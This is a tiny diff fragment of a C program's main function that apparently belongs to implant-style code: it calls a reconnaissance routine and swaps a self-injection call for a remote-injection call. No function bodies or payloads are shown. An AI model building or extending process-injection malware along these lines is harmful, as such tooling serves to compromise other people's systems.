@@ -12,7 +12,8 @@ int main(VOID)
 
 	collect_recon();
 
-	inject_self(config);
+	//inject_self(config);
+	remote_inject();
 
 
 	return 0;
